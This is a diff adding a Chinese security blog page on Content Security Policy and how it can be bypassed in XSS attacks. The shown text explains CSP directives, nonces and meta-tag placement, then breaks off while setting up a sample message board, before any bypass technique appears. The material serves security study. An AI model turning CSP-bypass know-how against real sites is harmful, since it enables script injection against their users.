@@ -1,0 +1,1597 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="XSS之CSP绕过">
+<title>浅谈CSP绕过</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/'>
+
+<link rel="stylesheet" href="/scss/style.min.e1efb040517648e3208ef025cee1558f4e3e423656425dbd8e07546d18e42b3b.css"><meta property='og:title' content="浅谈CSP绕过">
+<meta property='og:description' content="XSS之CSP绕过">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-02-17T00:52:17&#43;08:00'/><meta property='article:modified_time' content='2025-02-17T00:52:17&#43;08:00'/>
+<meta name="twitter:title" content="浅谈CSP绕过">
+<meta name="twitter:description" content="XSS之CSP绕过">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu4212831438090465177.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">闭关修行，不问归期</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://fupanc-w1n.github.io/en/" >English</option>
+                                
+                                    <option value="https://fupanc-w1n.github.io/" selected>中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#csp简介">CSP简介</a>
+      <ol>
+        <li><a href="#csp策略的使用">CSP策略的使用</a></li>
+      </ol>
+    </li>
+    <li><a href="#csp绕过-1">CSP绕过</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#绕过手段">绕过手段</a></li>
+          </ol>
+        </li>
+        <li><a href="#例题分享">例题分享</a>
+          <ol>
+            <li><a href="#tagless">Tagless</a></li>
+            <li><a href="#display">display</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%82%B9/" style="background-color: #2a9d8f; color: #fff;">
+                其他知识点
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/">浅谈CSP绕过</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            XSS之CSP绕过
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 17, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="csp绕过">CSP绕过
+</h1><p>前面了解了一下HttpOnly，后面就没怎么再学习XSS的东西了，这里又遇到了这个，再来学习一下。</p>
+<h2 id="csp简介">CSP简介
+</h2><p>内容安全策略（Content Security Policy）是一种用于缓解大部分类型的内容注入攻击的web应用技术，比如xss、数据注入等可实现数据窃取、网站破坏行为的安全问题。该策略可以通过设定规则，来限制浏览器只能加载和指定特定来源的资源，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行，可以有效减少XSS等攻击的风险。但是同样存在绕过手段。</p>
+<p>CSP可以分为如下两种：</p>
+<ul>
+<li>Content-Security-Policy：</li>
+</ul>
+<p>通过响应头来设置，浏览器接收到这个头后，会立即执行策略。</p>
+<ul>
+<li>Content-Security-Policy-Report-Only：</li>
+</ul>
+<p>同样的通过响应头来设置，这个表示不执行限制选项，只记录未违反限制的行为，并且必须与<code>report-uri</code>选项配合使用。简单来说，就是可以通过这个HTTP头部来设置规则，同时必须要设置报告的uri，当前端页面的加载违反规则，浏览器只会以JSON格式向URI发送报告，而不会限制。具体可以参考 《<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only#:~:text=HTTP%20%2A%2A%20Content-Security-Policy-Report-Only%20%2A%2A%E5%93%8D%E5%BA%94%E5%A4%B4%E5%85%81%E8%AE%B8%20web%20%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E9%80%9A%E8%BF%87%E7%9B%91%E6%B5%8B%20%28%E4%BD%86%E4%B8%8D%E5%BC%BA%E5%88%B6%E6%89%A7%E8%A1%8C%29%20%E6%94%BF%E7%AD%96%E7%9A%84%E5%BD%B1%E5%93%8D%E6%9D%A5%E5%B0%9D%E8%AF%95%E6%94%BF%E7%AD%96%E3%80%82,POST%20%E8%AF%B7%E6%B1%82%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%20URI%E3%80%82%20%E6%9B%B4%E5%A4%9A%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8F%AF%E5%8F%82%E8%A7%81%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%20Content%20Security%20Policy%20%28CSP%29."  target="_blank" rel="noopener"
+    >Content-Security-Policy-Report-Only</a>》</p>
+<h3 id="csp策略的使用">CSP策略的使用
+</h3><p>简单说了一下CSP的分类，那么如何使用呢？可以通过如下两个方式：</p>
+<ul>
+<li>
+<p>HTTP响应头，Content-Security-Policy响应头，也就是前面说的那个。</p>
+</li>
+<li>
+<p>直接通过网页前端的 <code>&lt;mata&gt;</code> 标签</p>
+</li>
+</ul>
+<p>——————</p>
+<p>（1）常用的策略指令：</p>
+<ul>
+<li>script-src：定义了页面中Javascript的有效来源</li>
+<li>style-src：定义了页面中CSS样式的有效来源</li>
+<li>img-src：定义了页面中图片和图标的有效来源</li>
+<li>font-src：定义了字体加载的有效来源</li>
+<li>connect-src：定义了请求，如XMLHttpRequest（AJAX请求）、WebSocket和EventSource的连接来源。</li>
+<li>child-src：定义了web workers以及嵌套的浏览上下文（如<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>）的源。</li>
+<li>object-src：限制可以加载哪些插件（例如Flash、XSS等）</li>
+<li>default-src：定义那些没有被更精确指令指定的安全策略，也就是上面说的那些等，但是也有的指令不会被指定，比如base-uri，这个在后面的CSP绕过会说。</li>
+</ul>
+<p>（2）内容源的几点说明：</p>
+<p>其实就是取值，既然有有了指令，那么肯定要有指令内容，这里简单说几个：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* : 星号表示允许任何URL资源，没有限制
+</span></span><span class="line"><span class="cl">&#39;none&#39;：表示不匹配任何资源
+</span></span><span class="line"><span class="cl">&#39;self&#39; 同源策略,即允许同域名同端口下,同协议下的请求
+</span></span><span class="line"><span class="cl">&#39;unsafe-inline&#39; 允许使用内联资源，也就是允许&lt;script&gt;等标签和事件监听函数的执行，一般不会使用
+</span></span><span class="line"><span class="cl">&#39;unsafe-eval&#39;   允许不安全的动态代码执行,如js中的eval() Function()等函数
+</span></span><span class="line"><span class="cl">https:  只允许通过https协议加载资源
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nonce: 每次HTTP回应给出一个授权token,页面内嵌脚本必须有这个token,才会执行,设置值为：&#39;nonce-12345678&#39; 如下：
+</span></span><span class="line"><span class="cl">&lt;script nonce=&#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#34;&gt;alert(123)&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等，注意如上的单引号是必须的。其他的指令及内容参考：《<a class="link" href="https://juejin.cn/post/7426954121309356042"  target="_blank" rel="noopener"
+    >CSP</a>》</p>
+<p><strong>最后简单看看如何设置</strong>，对于响应头，如下即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">header(&#34;Content-Security-Policy: script-src &#39;self&#39;&#34;); 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于前端的<code>&lt;meta&gt;</code>标签，直接在前端写就行了，一般是在 HTML 文档的 <code>&lt;head&gt;</code> 部分使用 <code>&lt;meta&gt;</code> 标签来定义（并且如果定义在<code>&lt;body&gt;</code>标签则会被浏览器忽略导致无法实施CSP），比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;Content-Security-Policy&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;default-src &#39;self&#39; http://www.dlrb.com &#39;unsafe-inline&#39;&#34;</span> <span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是：</p>
+<ul>
+<li>
+<p>在 HTTP 响应头中的 CSP 策略会对整个页面生效，包括内联脚本、内联样式以及外部资源的加载。</p>
+</li>
+<li>
+<p><code>&lt;meta&gt;</code>标签设置的 CSP 策略仅对其之后的资源生效，而在 <code>&lt;meta&gt;</code> 标签之前存在内联脚本或样式，这些内联内容不会受到 CSP 策略的限制。因此应确保将其放置在<code> &lt;head&gt;</code> 部分的最前面，以覆盖所有内联脚本和样式。</p>
+</li>
+</ul>
+<p>简单本地测试代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 内联脚本 1：此时 CSP 尚未生效
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;内联脚本 1 执行&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;script-src &#39;none&#39;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 内联脚本 2：CSP 已生效，执行会被阻止
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;内联脚本 2 不会执行&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;script-src &#39;none&#39;&#34;&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 内联脚本 3：CSP 已生效，执行会被阻止
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;内联脚本 3 不会执行&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以改改看看前面的说明，完全正确。</p>
+<h2 id="csp绕过-1">CSP绕过
+</h2><p>如下是一个简单的留言框+CSP的前端页面，以这个代码来简单谈谈CSP绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;zh-CN&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> 
+</span></span><span class="line"><span class="cl">          <span class="na">content</span><span class="o">=</span><span class="s">&#34;default-src &#39;self&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   script-src &#39;self&#39; &#39;nonce-2726c7f26c9&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   style-src &#39;self&#39; https://fonts.googleapis.com;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   font-src https://fonts.gstatic.com;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   img-src &#39;self&#39; data:;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   object-src &#39;none&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   base-uri &#39;self&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   form-action &#39;self&#39;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>安全留言板<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;2726c7f26c9&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">body</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Roboto&#39;</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">max-width</span><span class="p">:</span> <span class="mi">800</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span> <span class="kc">auto</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nc">container</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="mh">#f5f5f5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">8</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">#</span><span class="nn">messageInput</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">width</span><span class="p">:</span> <span class="mi">70</span><span class="kt">%</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">margin-right</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">button</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="mh">#4CAF50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">border</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">cursor</span><span class="p">:</span> <span class="kc">pointer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nc">message-item</span> <span class="p">{</span>
